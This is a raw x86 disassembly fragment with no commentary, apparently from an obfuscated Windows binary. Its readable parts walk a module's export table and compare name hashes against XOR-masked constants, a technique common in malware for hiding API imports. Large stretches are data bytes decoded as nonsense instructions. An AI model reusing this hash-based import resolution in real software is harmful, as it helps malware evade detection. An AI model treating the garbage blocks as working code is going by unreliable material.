  40c509:	and    DWORD PTR ds:0x4337fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4337eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4337f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0xde605658
  40c577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c578:	icebp  
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	jl     0x40c526
  40c583:	cmp    edi,edi
  40c585:	loopne 0x40c5e0
  40c587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c588:	bswap  edi
  40c58a:	cmp    bh,BYTE PTR [edi+ebp*4]
  40c58d:	mov    esi,0xa4ccf602
  40c592:	pop    edx
  40c593:	dec    ebx
  40c594:	repz jo 0x40c56f
  40c597:	mov    ch,0xad
  40c599:	jge    0x40c573
  40c59b:	cdq    
  40c59c:	stc    
  40c59d:	test   DWORD PTR [edx],ebx
  40c59f:	mov    DWORD PTR [edi],ecx
  40c5a1:	int    0x24
  40c5a3:	add    al,0x5c
  40c5a5:	pop    ebx
  40c5a6:	cmc    
  40c5a7:	out    dx,al
  40c5a8:	das    
  40c5a9:	dec    ecx
  40c5aa:	fcmovnbe st,st(6)
  40c5ac:	add    eax,0xc1a86740
  40c5b1:	pop    eax
  40c5b2:	push   ecx
  40c5b3:	out    dx,al
  40c5b4:	and    al,0x35
  40c5b6:	jnp    0x40c5a6
  40c5b8:	fisub  DWORD PTR [edx]
  40c5ba:	out    dx,al
  40c5bb:	pop    ebp
  40c5bc:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5be:	adc    ch,BYTE PTR [ecx+eax*2]
  40c5c1:	mov    cs,WORD PTR [edx-0x6a26dc88]
  40c5c7:	or     eax,0x4402e396
  40c5cc:	inc    edx
  40c5cd:	ins    BYTE PTR es:[edi],dx
  40c5ce:	das    
  40c5cf:	and    esp,DWORD PTR [edi-0x65]
  40c5d2:	xor    al,0x40
  40c5d4:	sub    al,0xb5
  40c5d6:	fdiv   QWORD PTR [ebp+0x2d0d8366]
  40c5dc:	xor    BYTE PTR [esi+0x313d6516],dl
  40c5e2:	pusha  
  40c5e3:	ret    
  40c5e4:	pusha  
  40c5e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5e6:	imul   ebx,ebx,0xffffffcc
  40c5e9:	jl     0x40c5f0
  40c5eb:	mov    cl,0x80
  40c5ed:	rol    ah,cl
  40c5ef:	cs mov ebx,0x60b400cb
  40c5f5:	(bad)  
  40c5f6:	aas    
  40c5f7:	fnstsw WORD PTR [edi+0x13b56f1c]
  40c5fd:	lds    eax,FWORD PTR [eax+0x7f]
  40c600:	retf   
  40c601:	sbb    BYTE PTR [edx],al
  40c603:	outs   dx,BYTE PTR ds:[esi]
  40c604:	mov    edi,0xe0bfe55b
  40c609:	int    0xe5
  40c60b:	cwde   
  40c60c:	add    edi,ebp
  40c60e:	stos   BYTE PTR es:[edi],al
  40c60f:	cmp    al,0xa1
  40c611:	ror    DWORD PTR [edi+0x63],1
  40c614:	xor    eax,0x43a6cc58
  40c619:	push   esp
  40c61a:	or     al,0x8b
  40c61c:	xchg   edx,eax
  40c61d:	and    DWORD PTR [ebp-0x5e],ebp
  40c620:	imul   esi,DWORD PTR [edx-0x79],0x34
  40c624:	int    0xa6
  40c626:	sbb    al,0x1f
  40c628:	loopne 0x40c5cd
  40c62a:	std    
  40c62b:	bound  ebp,QWORD PTR [edi+0x24ab07fb]
  40c631:	dec    esp
  40c632:	xor    al,0x4f
  40c634:	mov    DWORD PTR [edi+0x645616e7],ecx
  40c63a:	loopne 0x40c5ed
  40c63c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c63d:	push   ebp
  40c63e:	mov    ds:0x833337ac,al
  40c643:	repz sub ecx,ebp
  40c646:	inc    ebx
  40c647:	in     eax,0xbd
  40c649:	add    edx,edx
  40c64b:	mov    ds:0x3c02c573,eax
  40c650:	loopne 0x40c634
  40c652:	cwde   
  40c653:	mov    ecx,0x27745e66
  40c658:	div    ah
  40c65a:	(bad)  
  40c65b:	pop    edi
  40c65c:	mov    bl,0x74
  40c65e:	fldcw  WORD PTR [esi]
  40c660:	mov    WORD PTR [edx-0x156a76e9],es
  40c666:	loopne 0x40c5fa
  40c668:	push   edx
  40c669:	stc    
  40c66a:	scas   eax,DWORD PTR es:[edi]
  40c66b:	push   0xffffffe1
  40c66d:	sub    eax,DWORD PTR [ecx-0x5]
  40c670:	or     esi,DWORD PTR [ebx+edx*1+0x2888ad15]
  40c677:	xchg   ebx,eax
  40c678:	or     edi,DWORD PTR [eax+0x35443e18]
  40c67e:	and    eax,0xafebc2e1
  40c683:	shr    DWORD PTR [edx],0xf4
  40c686:	dec    esp
  40c687:	scas   eax,DWORD PTR es:[edi]
  40c688:	jp     0x40c6be
  40c68a:	sub    DWORD PTR [edx+ebx*8],esp
  40c68d:	mov    di,0xf4bd
  40c691:	sbb    al,0xc1
  40c693:	fild   QWORD PTR [esi]
  40c695:	sbb    bl,BYTE PTR [ebx+0x48]
  40c698:	mov    eax,eax
  40c69a:	xchg   ecx,eax
  40c69b:	mov    ebx,cs
  40c69d:	clc    
  40c69e:	xor    BYTE PTR [esi+0x3e],0xd0
  40c6a2:	and    BYTE PTR [ebp-0x1d],bh
  40c6a5:	fucomp st(4)
  40c6a7:	bound  esp,QWORD PTR cs:[edi-0x4f]
  40c6ab:	xchg   esp,eax
  40c6ac:	in     eax,0x8a
  40c6ae:	loop   0x40c70b
  40c6b0:	sbb    eax,DWORD PTR [edi-0x6e]
  40c6b3:	cs pop ds
  40c6b5:	jae    0x40c6b3
  40c6b7:	into   
  40c6b8:	hlt    
  40c6b9:	test   DWORD PTR [edx],ecx
  40c6bb:	scas   al,BYTE PTR es:[edi]
  40c6bc:	out    0xe1,eax
  40c6be:	jae    0x40c715
  40c6c0:	retf   0xc1be
  40c6c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6c4:	jg     0x40c6de
  40c6c6:	xchg   edi,eax
  40c6c7:	jmp    0x5d9e:0xd1a6d5b8
  40c6ce:	lods   al,BYTE PTR ds:[esi]
  40c6cf:	sub    al,0xef
  40c6d1:	stos   DWORD PTR es:[edi],eax
  40c6d2:	mov    al,0xda
  40c6d4:	xchg   ecx,eax
  40c6d5:	pop    ss
  40c6d6:	pop    edx
  40c6d7:	loope  0x40c69c
  40c6d9:	and    al,0x6
  40c6db:	aad    0xd4
  40c6dd:	into   
  40c6de:	push   ecx
  40c6df:	mov    ebp,0x1fe62244
  40c6e4:	push   ds
  40c6e5:	sbb    BYTE PTR [eax-0x25],0x58
  40c6e9:	and    BYTE PTR [ecx-0x39369462],cl
  40c6ef:	stos   DWORD PTR es:[edi],eax
  40c6f0:	jl     0x40c70d
  40c6f2:	mov    dh,0x50
  40c6f4:	ins    BYTE PTR es:[edi],dx
  40c6f5:	push   edx
  40c6f6:	das    
  40c6f7:	xor    al,0x30
  40c6f9:	rcl    BYTE PTR [edi],1
  40c6fb:	add    al,BYTE PTR [ebx+0x2a]
  40c6fe:	mov    ebx,0xb6e20314
  40c703:	mov    dh,0x89
  40c705:	fwait
  40c706:	mov    ecx,DWORD PTR [ecx]
  40c708:	xor    bh,BYTE PTR [edi]
  40c70a:	(bad)  
  40c70b:	(bad)  
  40c70c:	and    DWORD PTR [ebx-0x6d],esi
  40c70f:	or     BYTE PTR [ecx],0x95
  40c712:	pop    ecx
  40c713:	or     al,0x5c
  40c715:	outs   dx,BYTE PTR ds:[esi]
  40c716:	cli    
  40c717:	(bad)
  40c71b:	xchg   esp,eax
  40c71c:	jb     0x40c794
  40c71e:	and    BYTE PTR [ecx+0x23],dh
  40c721:	hlt    
  40c722:	leave  
  40c723:	add    al,0x2e
  40c725:	repz pop ebp
  40c727:	(bad)  
  40c728:	pop    esp
  40c729:	in     al,0xca
  40c72b:	inc    edx
  40c72c:	cmp    BYTE PTR [edi+ebx*2-0x43],al
  40c730:	push   ecx
  40c731:	or     esp,DWORD PTR [ebp-0x3a]
  40c734:	jg     0x40c79f
  40c736:	outs   dx,BYTE PTR ds:[esi]
  40c737:	cld    
  40c738:	cmp    al,0xd2
  40c73a:	push   0xffffffa1
  40c73c:	retf   0x78ad
  40c73f:	push   ebx
  40c740:	sub    dl,dh
  40c742:	cmp    dl,ah
  40c744:	inc    edx
  40c745:	ins    BYTE PTR es:[edi],dx
  40c746:	xchg   ebp,eax
  40c747:	test   al,0x72
  40c749:	scas   al,BYTE PTR es:[edi]
  40c74a:	loope  0x40c785
  40c74c:	scas   eax,DWORD PTR es:[edi]
  40c74d:	cmc    
  40c74e:	aaa    
  40c74f:	pop    edi
  40c750:	xor    eax,0x1333fe7a
  40c755:	wbinvd 
  40c757:	xchg   edx,eax
  40c758:	std    
  40c759:	call   0x2420:0x7e580fb3
  40c760:	ins    BYTE PTR es:[edi],dx
  40c761:	push   cs
  40c762:	mov    esi,0xc233e08d
  40c767:	dec    edx
  40c768:	inc    ecx
  40c769:	mov    bl,0x4
  40c76b:	pop    ebx
  40c76c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c76d:	ja     0x40c6f4
  40c76f:	push   ds
  40c770:	nop
  40c771:	cmp    ecx,0x40
  40c774:	lea    ebx,[ebx+esi*2]
  40c777:	push   edi
  40c778:	add    BYTE PTR [ebp-0xb01c371],dl
  40c77e:	(bad)  
  40c77f:	pop    edi
  40c781:	inc    esp
  40c782:	jecxz  0x40c7ed
  40c784:	add    al,0x4b
  40c786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c787:	sub    dh,ah
  40c789:	dec    ebp
  40c78a:	call   0x6b37f7a9
  40c78f:	hlt    
  40c790:	pushf  
  40c791:	jne    0x40c7d0
  40c793:	inc    ebx
  40c794:	(bad)  [edx+ebp*8-0x5d]
  40c798:	int    0xe2
  40c79a:	xchg   ebx,eax
  40c79b:	and    al,0x1f
  40c79d:	push   esp
  40c79e:	sub    al,dh
  40c7a0:	test   BYTE PTR [eax-0xb],0xad
  40c7a4:	mov    BYTE PTR [esi-0x429dfc1],ch
  40c7aa:	jle    0x40c7f9
  40c7ac:	stos   DWORD PTR es:[edi],eax
  40c7ad:	add    esi,esp
  40c7af:	xchg   esp,eax
  40c7b0:	xor    DWORD PTR [esi+0xc],ebx
  40c7b3:	push   ecx
  40c7b4:	imul   esp,DWORD PTR [ebx+0x8],0x38
  40c7b8:	lahf   
  40c7b9:	mov    edi,0xe247fe35
  40c7be:	mov    ss,WORD PTR [eax+0x4b]
  40c7c1:	mul    DWORD PTR [ebx]
  40c7c3:	dec    edx
  40c7c4:	or     al,0x50
  40c7c6:	mov    BYTE PTR [ebx+0x14],0x97
  40c7ca:	imul   ebp,DWORD PTR [edx+0x53],0xffffff86
  40c7ce:	inc    esi
  40c7cf:	addr16 popf 
  40c7d1:	dec    ebx
  40c7d2:	lea    edx,[ecx-0x2057168c]
  40c7d8:	push   ebx
  40c7d9:	pusha  
  40c7da:	(bad)  
  40c7db:	js     0x40c7d4
  40c7dd:	pop    ss
  40c7de:	test   BYTE PTR [ebx],0x17
  40c7e1:	dec    edx
  40c7e2:	cmp    DWORD PTR [edi+0x4b],esi
  40c7e5:	inc    esi
  40c7e6:	hlt    
  40c7e7:	xchg   DWORD PTR [ecx],edi
  40c7e9:	daa    
  40c7ea:	mov    eax,ds:0x7aa375d8
  40c7ef:	and    al,0x6e
  40c7f1:	fs and eax,0xfd72fdb6
  40c7f7:	(bad)  
  40c7f9:	lahf   
  40c7fa:	addr16 jae 0x40c875
  40c7fd:	mov    ds:0xa5917430,eax
  40c802:	pusha  
  40c803:	je     0x40c80e
  40c805:	add    DWORD PTR [ebx],eax
  40c807:	inc    eax
  40c808:	sub    bh,ch
  40c80a:	push   cs
  40c80b:	ds ret 0xd300
  40c80f:	mov    al,ds:0xe8e33ead
  40c814:	xchg   BYTE PTR [edx-0x7470ca35],ch
  40c81a:	push   cs
  40c81b:	cmp    eax,DWORD PTR [eax+0x58]
  40c81e:	aaa    
  40c81f:	out    0xde,al
  40c821:	inc    eax
  40c822:	dec    BYTE PTR [ebx+0x79a2cef4]
  40c828:	inc    esi
  40c829:	mov    DWORD PTR [esi],0x40e2b0b0
  40c82f:	shl    dl,1
  40c831:	cwde   
  40c832:	aam    0x5b
  40c834:	xchg   esp,eax
  40c835:	in     eax,0xa6
  40c837:	daa    
  40c838:	mov    esi,0xdb5e1c78
  40c83d:	or     eax,0xec863bc4
  40c842:	(bad)  
  40c843:	jne    0x40c877
  40c845:	adc    ah,dh
  40c847:	jge    0x40c82d
  40c849:	mov    edi,0xdeffa8de
  40c84e:	push   ebx
  40c84f:	fadd   QWORD PTR [ebx]
  40c851:	push   esp
  40c852:	pop    edi
  40c853:	xchg   ebp,eax
  40c854:	in     al,0x28
  40c856:	mov    edx,0xd26529ed
  40c85b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85c:	cmp    DWORD PTR [esi-0x46],ecx
  40c85f:	push   es
  40c860:	not    DWORD PTR [edx-0x74a254e8]
  40c866:	dec    ebp
  40c867:	pop    ds
  40c868:	sub    esp,esi
  40c86a:	mov    esp,0x1e603274
  40c86f:	mov    ah,0xa1
  40c871:	gs sbb ecx,edx
  40c874:	call   0xd54e:0x9dcb19b1
  40c87b:	sub    ebp,DWORD PTR [edi-0x4254323]
  40c881:	xchg   eax,edx
  40c883:	adc    al,0x8b
  40c885:	inc    ebp
  40c886:	in     al,dx
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	and    al,0x4
  40c8b4:	mov    ds:0x7e8c274a,eax
  40c8b9:	jle    0x40c938
  40c8bb:	jge    0x40c93b
  40c8bd:	jle    0x40c8d3
  40c8bf:	loop   0x40c910
  40c8c1:	sbb    al,dh
  40c8c3:	jno    0x40c8dc
  40c8c5:	push   esi
  40c8c6:	lea    esp,[esi+0x2326db4e]
  40c8cc:	push   eax
  40c8cd:	push   esp
  40c8ce:	loopne 0x40c8dd
  40c8d0:	arpl   WORD PTR [ebp-0x3c2153ad],ax
  40c8d6:	and    al,0x3b
  40c8d8:	sbb    edi,DWORD PTR [esp+esi*2-0x75]
  40c8dc:	aad    0x1e
  40c8de:	mov    bl,0xae
  40c8e0:	jg     0x40c909
  40c8e2:	out    dx,al
  40c8e3:	test   BYTE PTR [ecx],bl
  40c8e5:	pmaddwd mm2,QWORD PTR [eax-0x7d]
  40c8e9:	adc    ch,BYTE PTR [ebp+0x51]
  40c8ec:	mov    al,0x2b
  40c8ee:	jecxz  0x40c8e6
  40c8f0:	or     DWORD PTR [ecx],esi
  40c8f2:	call   0xc5a7:0x933d2be1
  40c8f9:	fstp   TBYTE PTR [esi]
  40c8fb:	jb     0x40c8cc
  40c8fd:	mov    ebp,0xc4d97448
  40c902:	and    BYTE PTR [ebx],0xd8
  40c905:	cli    
  40c906:	dec    ebp
  40c907:	cli    
  40c908:	add    dl,al
  40c90a:	daa    
  40c90b:	push   cs
  40c90c:	cmp    bl,cl
  40c90e:	iret   
  40c90f:	jmp    0xa5ff:0xe0bd5e9d
  40c916:	sbb    DWORD PTR [ebx+eax*2-0x71],0x58
  40c91b:	test   BYTE PTR [ebx],dh
  40c91d:	cmp    eax,0xe1e5a089
  40c922:	mov    ch,0xf1
  40c924:	sbb    al,BYTE PTR [eax+0x13be8260]
  40c92a:	adc    DWORD PTR [esi-0x3d33cebc],edi
  40c930:	icebp  
  40c931:	pusha  
  40c932:	inc    ecx
  40c933:	xchg   bl,dh
  40c935:	mov    ecx,0xa0cc795d
  40c93a:	mov    edx,edx
  40c93c:	fs test edx,ebp
  40c93f:	sub    BYTE PTR [ebp-0x78ed99f1],ah
  40c945:	lock imul ecx,edi,0x3c
  40c949:	jmp    0x40c91f
  40c94b:	add    BYTE PTR [esi-0x3a],al
  40c94e:	mov    ecx,0x93e5afff
  40c953:	dec    esp
  40c954:	frstor [ecx-0x3f]
  40c957:	nop
  40c958:	scas   eax,DWORD PTR es:[edi]
  40c959:	sub    ch,cl
  40c95b:	sbb    bh,dl
  40c95d:	xchg   ebp,eax
  40c95e:	data16 clc 
  40c960:	mov    eax,0x1274fb9b
  40c965:	add    DWORD PTR [bp+si],ebx
  40c968:	scas   al,BYTE PTR es:[edi]
  40c969:	push   edi
  40c96a:	loop   0x40c935
  40c96c:	call   0xc967b857
  40c971:	scas   al,BYTE PTR es:[edi]
  40c972:	and    al,0x74
  40c974:	int3   
  40c975:	push   eax
  40c976:	dec    edx
  40c977:	add    ah,BYTE PTR [edi]
  40c979:	mov    ah,0xc0
  40c97b:	lahf   
  40c97c:	imul   ecx,DWORD PTR [ebx+0x47e8f5eb],0x6d
  40c983:	or     DWORD PTR [ecx],0x12
  40c986:	ffreep st(5)
  40c988:	pop    ss
  40c989:	into   
  40c98a:	mov    esp,0x196f79c0
  40c98f:	shl    cl,1
  40c991:	outs   dx,DWORD PTR es:[esi]
  40c993:	fdivr  QWORD PTR [esi+0x39]
  40c996:	xor    eax,ebx
  40c998:	push   eax
  40c999:	sbb    al,0x61
  40c99b:	pop    ss
  40c99c:	cli    
  40c99d:	jmp    0xab83:0x976c9150
  40c9a4:	pusha  
  40c9a5:	dec    ecx
  40c9a6:	loop   0x40ca24
  40c9a8:	xor    BYTE PTR [ebp+ebx*4-0x2],bl
  40c9ac:	sbb    dh,dh
  40c9ae:	add    eax,0x1679f257
  40c9b3:	xor    ebp,DWORD PTR [ecx+0x2c]
  40c9b6:	pop    esi
  40c9b7:	cmp    al,0x2a
  40c9b9:	call   0xc99a63b3
  40c9be:	jp     0x40c9e6
  40c9c0:	lods   eax,DWORD PTR ds:[esi]
  40c9c1:	jne    0x40c973
  40c9c3:	neg    DWORD PTR ds:0x11d4ff74
  40c9c9:	ja     0x40c9f4
  40c9cb:	sbb    DWORD PTR [bx-0x6c],esi
  40c9cf:	rcl    ebx,cl
  40c9d1:	adc    cl,bh
  40c9d3:	pop    es
  40c9d4:	popa   
  40c9d5:	or     edx,DWORD PTR [ebp+esi*1-0x1f3e6d5e]
  40c9dc:	xchg   esi,eax
  40c9dd:	lock call 0xcc740b18
  40c9e3:	push   esi
  40c9e4:	in     eax,dx
  40c9e5:	ror    ah,cl
  40c9e7:	push   edi
  40c9e8:	inc    esp
  40c9e9:	or     esp,ecx
  40c9eb:	mov    ds:0x7d915121,eax
  40c9f0:	cli    
  40c9f1:	and    DWORD PTR [ebp-0x5f7d0322],edx
  40c9f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9f8:	mov    esp,0x81db292d
  40c9fd:	(bad)  
  40c9fe:	push   ecx
  40c9ff:	dec    ebp
  40ca00:	dec    eax
  40ca01:	jle    0x40ca1f
  40ca03:	adc    DWORD PTR [eax-0x1a6eb427],ecx
  40ca09:	inc    edx
  40ca0a:	jnp    0x40c9ca
  40ca0c:	(bad)  
  40ca0d:	test   eax,0x65416e4
  40ca12:	jbe    0x40ca30
  40ca14:	(bad)  
  40ca15:	xor    eax,0xab1da997
  40ca1a:	pop    esi
  40ca1b:	or     BYTE PTR [edi+0x51],al
  40ca1e:	adc    bh,BYTE PTR [eax+0x136dfd0d]
  40ca24:	aam    0x96
  40ca26:	mov    dl,0x4b
  40ca28:	cwde   
  40ca29:	push   ecx
  40ca2a:	or     bh,BYTE PTR [eax]
  40ca2c:	inc    ecx
  40ca2d:	fcom   QWORD PTR [esi+0x73]
  40ca30:	dec    edx
  40ca31:	cmp    ebx,ecx
  40ca33:	cmp    eax,0x76d8ab98
  40ca38:	cli    
  40ca39:	cmp    dl,BYTE PTR [eax+0x2d]
  40ca3c:	shl    esp,1
  40ca3e:	inc    ecx
  40ca3f:	imul   esi,DWORD PTR [ebp-0x80],0x2999eaf7
  40ca46:	cld    
  40ca47:	jg     0x40ca36
  40ca49:	scas   eax,DWORD PTR es:[edi]
  40ca4a:	inc    edx
  40ca4b:	test   BYTE PTR [edx+0x34],bh
  40ca4e:	(bad)  
  40ca4f:	jg     0x40ca0c
  40ca51:	nop
  40ca52:	dec    eax
  40ca53:	icebp  
  40ca54:	iret   
  40ca55:	stos   BYTE PTR es:[edi],al
  40ca56:	out    0xbc,al
  40ca58:	jp     0x40ca3a
  40ca5a:	cli    
  40ca5b:	lods   al,BYTE PTR ds:[esi]
  40ca5c:	aas    
  40ca5d:	lock sbb ch,BYTE PTR [ecx]
  40ca60:	ins    BYTE PTR es:[edi],dx
  40ca61:	iret   
  40ca62:	jnp    0x40ca78
  40ca64:	mov    ds:0xd15dda7b,eax
  40ca69:	mov    al,ds:0xaa2be60d
  40ca6e:	test   eax,0xcc99271d
  40ca73:	mov    ds:0x61a87923,eax
  40ca78:	fadd   QWORD PTR [ebx-0x6befd8cc]
  40ca7e:	repnz add al,0xae
  40ca81:	popa   
  40ca82:	pop    esp
  40ca83:	adc    DWORD PTR [ebx],edx
  40ca85:	cmp    eax,DWORD PTR [esi]
  40ca87:	adc    al,0x66
  40ca89:	enter  0x8d9c,0x11
  40ca8d:	ret    
  40ca8e:	mov    bl,0x3d
  40ca90:	(bad)  
  40ca91:	push   ds
  40ca92:	gs inc esi
  40ca94:	adc    esi,DWORD PTR [ecx+eiz*2-0x49258e5a]
  40ca9b:	xchg   ebp,eax
  40ca9c:	std    
  40ca9d:	mov    DWORD PTR [edi-0x25a36e59],ebx
  40caa3:	imul   eax,ecx,0xffffffd0
  40caa6:	mov    edi,0x2b3dc16e
  40caab:	je     0x40cb27
  40caad:	(bad)  
  40caae:	out    dx,eax
  40caaf:	fidivr WORD PTR [ebp+eiz*1+0x372a4420]
  40cab6:	push   es
  40cab7:	jae    0x40cb15
  40cab9:	jl     0x40cacd
  40cabb:	jne    0x40cb02
  40cabd:	pusha  
  40cabe:	mov    ah,0xb
  40cac0:	cmc    
  40cac1:	xchg   cl,dh
  40cac3:	inc    esp
  40cac4:	push   ebx
  40cac5:	adc    BYTE PTR [ebx],bh
  40cac7:	imul   edx,DWORD PTR [edx-0x23c3ff11],0xffffffbe
  40cace:	gs dec eax
  40cad0:	shl    edi,cl
  40cad2:	xor    BYTE PTR [eax],bl
  40cad4:	mov    ebp,0xb63ea007
  40cad9:	test   al,0xf3
  40cadb:	cmc    
  40cadc:	cli    
  40cadd:	inc    ebp
  40cade:	neg    DWORD PTR [ecx+0x539de6e0]
  40cae4:	fld    QWORD PTR [edx-0x4d]
  40cae7:	(bad)  
  40cae8:	stos   DWORD PTR es:[edi],eax
  40cae9:	loop   0x40cad7
  40caeb:	pop    edi
  40caec:	xchg   bh,dh
  40caee:	or     al,0xc6
  40caf0:	loopne 0x40caf5
  40caf2:	or     dh,al
  40caf4:	add    al,0x16
  40caf6:	sahf   
  40caf7:	sbb    ecx,DWORD PTR [esi-0x7abdbc5a]
  40cafd:	cwde   
  40cafe:	cmp    esi,DWORD PTR [esi-0x70]
  40cb01:	xchg   edx,eax
  40cb02:	sub    edi,DWORD PTR [edx+ebx*2-0xa]
  40cb06:	adc    DWORD PTR [ebp-0x6be68c9e],esi
  40cb0c:	cwde   
  40cb0d:	daa    
  40cb0e:	sbb    ebx,eax
  40cb10:	pop    esp
  40cb11:	xchg   ebx,eax
  40cb12:	xchg   DWORD PTR [edx+edi*1+0x2b],ebx
  40cb16:	mov    ds:0x16e0674,al
  40cb1b:	outs   dx,BYTE PTR ds:[esi]
  40cb1c:	sub    bh,ah
  40cb1e:	sbb    edi,DWORD PTR [esi+0x7e663fff]
  40cb24:	addr16 xchg edi,eax
  40cb26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb27:	cs clc 
  40cb29:	ror    esp,0x2f
  40cb2c:	sbb    BYTE PTR [edi+0x1876511f],bh
  40cb32:	pop    ss
  40cb33:	mov    eax,ds:0xf86b8a4a
  40cb38:	adc    eax,0xfea8d460
  40cb3d:	test   BYTE PTR [edx],0xd2
  40cb40:	mov    ds:0x20fb31df,al
  40cb45:	pop    ds
  40cb46:	fnstsw WORD PTR [eax-0x7b10fa53]
  40cb4c:	out    0x64,eax
  40cb4e:	lods   eax,DWORD PTR ds:[esi]
  40cb4f:	ret    
  40cb50:	ror    BYTE PTR [ecx+eax*1+0x4c],0x50
  40cb55:	sbb    al,0xbb
  40cb57:	xchg   esi,eax
  40cb58:	xlat   BYTE PTR ds:[ebx]
  40cb59:	cmp    eax,0x5ecc444f
  40cb5e:	add    dh,ah
  40cb60:	stc    
  40cb61:	xchg   esi,eax
  40cb62:	pop    ebx
  40cb63:	sahf   
  40cb64:	push   es
  40cb65:	and    al,0x36
  40cb67:	mov    edi,DWORD PTR [ebx]
  40cb69:	scas   eax,DWORD PTR es:[edi]
  40cb6a:	inc    edx
  40cb6b:	push   ebp
  40cb6c:	mov    ebp,0xe994f2c7
  40cb71:	ja     0x40cbca
  40cb73:	mov    ebp,0xb9db8265
  40cb78:	push   ss
  40cb79:	ret    0x4055
  40cb7c:	and    dl,BYTE PTR [ebx]
  40cb7e:	cmp    esp,DWORD PTR [ebp+0x17a78e45]
  40cb84:	popa   
  40cb85:	shl    BYTE PTR [ebp+0x62],1
  40cb88:	imul   esp,edi,0x55
  40cb8b:	mov    BYTE PTR [ebx+esi*1],dl
  40cb8e:	mov    esi,0x16d92133
  40cb93:	(bad)  
  40cb94:	xor    ebp,edx
  40cb96:	cmp    BYTE PTR [edi-0x23],al
  40cb99:	retf   0x4abd
  40cb9c:	sbb    DWORD PTR [eax-0x283cd77],esp
  40cba2:	lock mov al,0xd8
  40cba5:	add    esp,DWORD PTR [edi+0x5e97f7c3]
  40cbab:	int3   
  40cbac:	mov    ebp,0x646ee0be
  40cbb1:	xor    bh,BYTE PTR ds:0x3b2e2da
  40cbb7:	nop
  40cbb8:	popa   
  40cbb9:	pop    esi
  40cbba:	mov    edx,0xfb244f82
  40cbbf:	clc    
  40cbc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbc1:	push   eax
  40cbc2:	push   DWORD PTR [ebp-0x30]
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x222151e3
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	or     BYTE PTR [ecx],al
  40cc50:	imul   esi,DWORD PTR [edx-0x7f],0x7d0b412b
